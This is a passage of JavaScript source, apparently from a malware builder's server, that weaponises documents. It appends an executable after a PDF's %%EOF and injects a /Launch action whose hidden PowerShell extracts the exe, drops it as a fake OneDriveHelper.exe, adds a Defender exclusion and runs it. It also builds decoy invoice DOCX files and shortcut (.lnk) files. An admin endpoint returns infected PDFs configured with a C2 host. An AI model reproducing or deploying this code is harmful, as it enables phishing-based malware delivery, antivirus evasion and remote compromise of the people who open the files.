  off[3] = pos(); add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n" +
    "   /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >>\n   /Contents 4 0 R >>\nendobj\n\n");
  off[4] = pos();
  add(`4 0 obj\n<< /Length ${cBuf.length} >>\nstream\n`);
  parts.push(cBuf);
  add("\nendstream\nendobj\n\n");
  off[5] = pos(); add("5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>\nendobj\n\n");
  off[6] = pos(); add("6 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>\nendobj\n\n");
  off[7] = pos(); add(launchObj);

  const xrefPos = pos();
  let xr = "xref\n0 8\n0000000000 65535 f \n";
  for (let i = 1; i <= 7; i++) xr += String(off[i]).padStart(10, "0") + " 00000 n \n";
  xr += `trailer\n<< /Root 1 0 R /Size 8 >>\nstartxref\n${xrefPos}\n%%EOF\n`;
  add(xr);

  // ── Two-pass: patch sentinel offset, then append exe after %%EOF ───────────
  // PDF readers ignore everything after %%EOF. The exe sits there invisibly.
  // PowerShell reads the PDF file itself and slices out the exe bytes.
  const pdfBuf    = Buffer.concat(parts);
  const exeOffset = pdfBuf.length;
  const offsetStr = String(exeOffset).padStart(8, "0");

  // Locate "$o=12345678" sentinel in the PDF bytes and overwrite the 8-digit value
  const sentinel = Buffer.from("$o=12345678", "latin1");
  const sidx     = pdfBuf.indexOf(sentinel);
  if (sidx !== -1) Buffer.from(offsetStr, "latin1").copy(pdfBuf, sidx + 3);

  return Buffer.concat([pdfBuf, exeBuf]);
}

// ── Decoy DOCX generator ──────────────────────────────────────────────────────
// Generates a minimal but realistic DOCX (Open XML) invoice document.
// DOCX = ZIP containing XML files — built from scratch without external dependencies.

const CRC32_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32buf(buf) {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC32_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}

function buildZip(entries) {
  // entries: [{name: string, data: Buffer}]  — stored uncompressed for simplicity
  const localParts = [];
  const cdParts    = [];
  let   offset     = 0;

  for (const { name, data } of entries) {
    const nameBuf = Buffer.from(name, "utf8");
    const crc     = crc32buf(data);
    const lh      = Buffer.alloc(30 + nameBuf.length, 0);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(data.length, 18);
    lh.writeUInt32LE(data.length, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    nameBuf.copy(lh, 30);

    const cd = Buffer.alloc(46 + nameBuf.length, 0);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE(20, 4);
    cd.writeUInt16LE(20, 6);
    cd.writeUInt32LE(crc, 16);
    cd.writeUInt32LE(data.length, 20);
    cd.writeUInt32LE(data.length, 24);
    cd.writeUInt16LE(nameBuf.length, 28);
    cd.writeUInt32LE(offset, 42);
    nameBuf.copy(cd, 46);

    localParts.push(lh, data);
    cdParts.push(cd);
    offset += lh.length + data.length;
  }

  const cdBuf  = Buffer.concat(cdParts);
  const eocd   = Buffer.alloc(22, 0);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);

  return Buffer.concat([...localParts, cdBuf, eocd]);
}

function buildDecoyDocx(opts = {}) {
  const from = opts.from || "Nexus Solutions Ltd.";
  const to   = opts.to   || "Acme Corporation";
  const note = opts.note || "";

  const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
  const now    = new Date();
  const fmtD   = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
  const due    = new Date(now.getTime() + 30 * 24 * 3600 * 1000);
  const x      = s => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  const para = (text, bold = false, sz = 22) => {
    const rpr = bold ? `<w:rPr><w:b/><w:sz w:val="${sz}"/></w:rPr>` : `<w:rPr><w:sz w:val="${sz}"/></w:rPr>`;
    return `<w:p><w:r>${rpr}<w:t>${x(text)}</w:t></w:r></w:p>`;
  };
  const row = (cells) => `<w:tr>${cells.map(c =>
    `<w:tc><w:tcPr><w:tcW w:w="2380" w:type="dxa"/></w:tcPr><w:p><w:r><w:rPr><w:sz w:val="18"/></w:rPr><w:t>${x(c)}</w:t></w:r></w:p></w:tc>`
  ).join("")}</w:tr>`;

  const docXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
${para(from, true, 48)}
${para("123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom", false, 18)}
${para("Tel: +44 20 7946 0958  |  accounts@nexus-solutions.co.uk", false, 18)}
${para(" ")}
${para("INVOICE", true, 36)}
${para("Invoice Number:  " + invNum, false, 20)}
${para("Invoice Date:    " + fmtD(now), false, 20)}
${para("Payment Due:     " + fmtD(due), false, 20)}
${para(" ")}
${para("Bill To:", true, 20)}
${para(to, false, 20)}
${para("Finance Department", false, 20)}
${para("456 Corporate Avenue, New York, NY 10001", false, 20)}
${para(" ")}
<w:tbl>
<w:tblPr><w:tblStyle w:val="TableGrid"/><w:tblW w:w="9520" w:type="dxa"/></w:tblPr>
${row(["Description","Qty","Unit Price","Total"])}
${row(["Professional Services - Q4 Consulting","1","$4,200.00","$4,200.00"])}
${row(["Software License Renewal (Annual)","1","$1,800.00","$1,800.00"])}
${row(["Technical Support - 12 hrs @ $80/hr","12","$80.00","$960.00"])}
${row(["Cloud Infrastructure - November 2024","1","$340.00","$340.00"])}
${row(["","","Subtotal:","$7,300.00"])}
${row(["","","VAT (20%):","$1,460.00"])}
${row(["","","TOTAL DUE:","$8,760.00"])}
</w:tbl>
${para(" ")}
${para("Payment Instructions:", true, 20)}
${para("Bank: National Westminster Bank Plc", false, 18)}
${para("Account: 12345678   Sort Code: 60-00-01   Reference: " + invNum, false, 18)}
${para("SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819", false, 18)}
${para(" ")}
${para("Thank you for your business. Payment is due within 30 days of invoice date.", false, 16)}
${note ? para(note, false, 16) : ""}
<w:sectPr/>
</w:body>
</w:document>`;

  const ct = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`;

  const rels = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`;

  const docRels = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>`;

  return buildZip([
    { name: "[Content_Types].xml",        data: Buffer.from(ct,      "utf8") },
    { name: "_rels/.rels",                data: Buffer.from(rels,    "utf8") },
    { name: "word/document.xml",          data: Buffer.from(docXml,  "utf8") },
    { name: "word/_rels/document.xml.rels", data: Buffer.from(docRels,"utf8") },
  ]);
}

// Minimal [MS-SHLLINK] .lnk binary format
// Flags: HasLinkInfo(0x02) + HasArguments(0x20) + IsUnicode(0x80) = 0xA2
function createLnkBuffer(target, args) {
  const CLSID = Buffer.from([
    0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,
    0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
  ]);

  const hdr = Buffer.alloc(76, 0);
  hdr.writeUInt32LE(0x4C,   0);   // HeaderSize
  CLSID.copy(hdr, 4);             // LinkCLSID
  hdr.writeUInt32LE(0xA2,  0x14); // LinkFlags
  hdr.writeUInt32LE(0x20,  0x18); // FileAttributes: FILE_ATTRIBUTE_ARCHIVE
  hdr.writeUInt32LE(7,     0x3C); // ShowCommand: SW_SHOWMINNOACTIVE
  hdr.writeUInt16LE(0,     0x40); // HotKey

  // VolumeID (volume label "C:\")
  const volLabel  = Buffer.from("C:\\\0", "ascii");
  const volID     = Buffer.alloc(16 + volLabel.length, 0);
  volID.writeUInt32LE(volID.length, 0); // VolumeIDSize
  volID.writeUInt32LE(3,            4); // DRIVE_FIXED
  volID.writeUInt32LE(0xABCD1234,   8); // DriveSerialNumber (placeholder)
  volID.writeUInt32LE(16,          12); // VolumeLabelOffset
  volLabel.copy(volID, 16);

  // LocalBasePath and CommonPathSuffix
  const localPath = Buffer.from(target + "\0", "ascii");
  const suffix    = Buffer.from("\0", "ascii");

  // LinkInfo header (28 bytes) + VolumeID + LocalBasePath + suffix
  const LI_HDR   = 0x1C;
  const volOff   = LI_HDR;
  const pathOff  = volOff  + volID.length;
  const sufOff   = pathOff + localPath.length;
  const liSize   = sufOff  + suffix.length;

  const li = Buffer.alloc(liSize, 0);
  li.writeUInt32LE(liSize,   0);
  li.writeUInt32LE(LI_HDR,   4);
  li.writeUInt32LE(0x01,     8);   // VolumeIDAndLocalBasePath
  li.writeUInt32LE(volOff,  12);
  li.writeUInt32LE(pathOff, 16);
  li.writeUInt32LE(0,       20);   // no network share
  li.writeUInt32LE(sufOff,  24);
  volID.copy(li,    volOff);
  localPath.copy(li, pathOff);
  suffix.copy(li,   sufOff);

  // StringData — CommandLineArguments: uint16 char-count + UTF-16LE
  const argStr = Buffer.from(args, "utf16le");
  const argLen = Buffer.alloc(2);
  argLen.writeUInt16LE(args.length, 0);

  return Buffer.concat([hdr, li, argLen, argStr]);
}

// ── PDF /Launch injection into an uploaded PDF ────────────────────────────────
// Uses PDF incremental-update spec: the original file bytes are untouched,
// new objects and a new xref section are appended at the end.
// Supports traditional xref tables (PDF 1.4).  Cross-reference streams
// (PDF 1.5+) require a "Save as PDF 1.4" step first.

function findObjInXref(pdfStr, xrefOff, objNum) {
  const lines = pdfStr.slice(xrefOff).split(/\r?\n/);
  let li = 0;
  if (lines[li].trim() === "xref") li++;
  while (li < lines.length) {
    const hdr = lines[li].trim();
    if (hdr === "trailer" || hdr.startsWith("<<")) break;
    const sub = hdr.match(/^(\d+)\s+(\d+)$/);
    if (!sub) { li++; continue; }
    const first = parseInt(sub[1]), count = parseInt(sub[2]);
    li++;
    for (let k = 0; k < count; k++, li++) {
      const m = (lines[li] || "").match(/^(\d{10})\s+\d{5}\s+([nf])/);
      if (!m) { k--; continue; }
      if (first + k === objNum && m[2] === "n") return parseInt(m[1]);
    }
  }
  return -1;
}

function injectLaunchIntoPdf(pdfBuf, psArgs) {
  const pdf = pdfBuf.toString("latin1");

  // Find the last startxref offset
  const sxAll = [...pdf.matchAll(/startxref\s*\r?\n\s*(\d+)/g)];
  if (!sxAll.length) throw new Error("No startxref — is this a valid PDF?");
  const origXrefOff = parseInt(sxAll[sxAll.length - 1][1]);

  // Reject cross-reference streams (PDF 1.5+)
  if (!pdf.slice(origXrefOff, origXrefOff + 5).trimStart().startsWith("xref")) {
    throw new Error(
      "This PDF uses cross-reference streams (PDF 1.5+). " +
      "Re-save as PDF 1.4 in Acrobat (Save As → PDF 1.4) or LibreOffice " +
      "(Export as PDF → Compatibility: PDF 1.4), then upload again."
    );
  }

  // Parse trailer for /Root and /Size
  const trailerM = pdf.slice(origXrefOff).match(/trailer\s*<<([\s\S]*?)>>/);
  if (!trailerM) throw new Error("Could not find PDF trailer dict");
  const tb = trailerM[1];
  const rootM = tb.match(/\/Root\s+(\d+)\s+0\s+R/);
  const sizeM = tb.match(/\/Size\s+(\d+)/);
  if (!rootM || !sizeM) throw new Error("Trailer missing /Root or /Size");

  const catNum      = parseInt(rootM[1]);
  const origSize    = parseInt(sizeM[1]);
  const newActNum   = origSize;   // next free object number

  // Find catalog object byte offset
  const catOff = findObjInXref(pdf, origXrefOff, catNum);
  if (catOff < 0) throw new Error("Catalog object not found in xref table");

  // Read catalog dict (between obj keyword and endobj)
  const catSrc = pdf.slice(catOff);
  const catM   = catSrc.match(/^\d+\s+0\s+obj\s*(<<[\s\S]*?>>)\s*(?:stream|endobj)/);
  if (!catM) throw new Error("Could not parse catalog dict");

  let catDict = catM[1];
  // Remove any pre-existing /OpenAction so we don't duplicate
  catDict = catDict.replace(/\/OpenAction\s+\d+\s+0\s+R\s*/g, "");
  // Insert our /OpenAction before the closing >>
  catDict = catDict.replace(/>>\s*$/, `/OpenAction ${newActNum} 0 R\n>>`);

  // Build the appended block
  const sep        = "\n";
  const updCat     = `${catNum} 0 obj\n${catDict}\nendobj\n\n`;
  const actObj     =
    `${newActNum} 0 obj\n` +
    `<< /Type /Action /S /Launch\n` +
    `   /Win << /F (powershell.exe)\n` +
    `           /P (${psArgs})\n` +
    `           /D (C:\\\\Windows\\\\System32) >> >>\n` +
    `endobj\n\n`;

  const base   = pdfBuf.length + Buffer.byteLength(sep, "latin1");
  const catAt  = base;
  const actAt  = base + Buffer.byteLength(updCat, "latin1");
  const xrAt   = actAt + Buffer.byteLength(actObj, "latin1");

  // Build xref subsections — two objects, possibly non-contiguous
  const objs = [{ n: catNum, o: catAt }, { n: newActNum, o: actAt }]
    .sort((a, b) => a.n - b.n);

  let xrSec = "xref\n";
  let i = 0;
  while (i < objs.length) {
    let j = i;
    while (j + 1 < objs.length && objs[j + 1].n === objs[j].n + 1) j++;
    xrSec += `${objs[i].n} ${j - i + 1}\n`;
    for (let k = i; k <= j; k++)
      xrSec += objs[k].o.toString().padStart(10, "0") + " 00000 n \n";
    i = j + 1;
  }

  const trailer =
    `trailer\n<< /Size ${origSize + 1} /Root ${catNum} 0 R /Prev ${origXrefOff} >>\n` +
    `startxref\n${xrAt}\n%%EOF\n`;

  return Buffer.concat([
    pdfBuf,
    Buffer.from(sep,    "latin1"),
    Buffer.from(updCat, "latin1"),
    Buffer.from(actObj, "latin1"),
    Buffer.from(xrSec + trailer, "latin1"),
  ]);
}

// Injects a self-contained /Launch into an existing PDF.
// Builds the exe fresh from Stub.exe, appends it after %%EOF, patches the offset sentinel.
function injectLaunchWithExe(pdfBuf, exeBuf, pdfFilename) {
  const exeSize = exeBuf.length;
  const fn      = (pdfFilename || "document").replace(/\.pdf$/i, "");

  const pdfStr = s => s.replace(/\\/g, "\\\\").replace(/\(/g, "\\(").replace(/\)/g, "\\)");

  const psRaw =
    `$fn='${fn}.pdf';` +
    `$u=$env:USERPROFILE;` +
    `$locs=@("$u\\Downloads","$u\\Desktop","$env:TEMP","$u\\Documents","$u\\OneDrive\\Desktop","$u\\OneDrive\\Downloads");` +
    `$fp=$locs|%{$p=Join-Path $_ $fn;if(Test-Path $p){$p}}|?{$_}|Select-Object -First 1;` +
    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter $fn -EA 0|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
    `if($fp){` +
    `$o=12345678;$z=${exeSize};` +
    `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
    `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
    `[IO.File]::WriteAllBytes($tp,$eb);` +
    `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
    `try{([wmiclass]'Win32_Process').Create($tp,$null,$null)|Out-Null}catch{Start-Process $tp -WindowStyle Hidden}` +
    `}`;

  const psArgs   = pdfStr(`-w hidden -nop -c "${psRaw}"`);
  const augmented = injectLaunchIntoPdf(pdfBuf, psArgs);

  // Patch $o= sentinel with real exe offset (= length of augmented PDF)
  const exeOffset = augmented.length;
  const offsetStr = String(exeOffset).padStart(8, "0");
  const sentinel  = Buffer.from("$o=12345678", "latin1");
  const sidx      = augmented.indexOf(sentinel);
  if (sidx !== -1) Buffer.from(offsetStr, "latin1").copy(augmented, sidx + 3);

  return Buffer.concat([augmented, exeBuf]);
}

// POST /api/builder/inject-pdf — upload any PDF, get it back self-contained with /Launch + exe embedded
router.post("/api/builder/inject-pdf", requireAdmin,
  pdfUpload.single("pdf"),
  (req, res) => {
    if (!req.file) return res.status(400).json({ error: "No PDF file received" });

    const host = (req.body.c2host || "").trim() || req.headers.host || "localhost";

    // Build a fresh configured exe every time
    let exeBuf;
    try {
      exeBuf = buildStubBinary({ c2Host: host, authKey: AUTH_KEY });
      try {
        if (!fs.existsSync(DL_DIR)) fs.mkdirSync(DL_DIR, { recursive: true });
        fs.writeFileSync(DL_HELPER, exeBuf);
      } catch (_) {}
    } catch (e) {
      // Fall back to cached exe if Stub.exe missing
      if (fs.existsSync(DL_HELPER)) {
        exeBuf = fs.readFileSync(DL_HELPER);
      } else {
        return res.status(500).json({ error: "Stub.exe not found: " + e.message });
      }
    }

    const origName   = (req.file.originalname || "document.pdf").replace(/[^a-zA-Z0-9._\- ]/g, "_");
    const pdfFilename = origName.replace(/\.pdf$/i, "");

    try {
      const result = injectLaunchWithExe(req.file.buffer, exeBuf, pdfFilename);
      res.setHeader("Content-Type", "application/pdf");
      res.setHeader("Content-Disposition", `attachment; filename="${origName}"`);
      res.send(result);
    } catch (e) {
      res.status(400).json({ error: e.message });
    }
  }
);

module.exports = router;
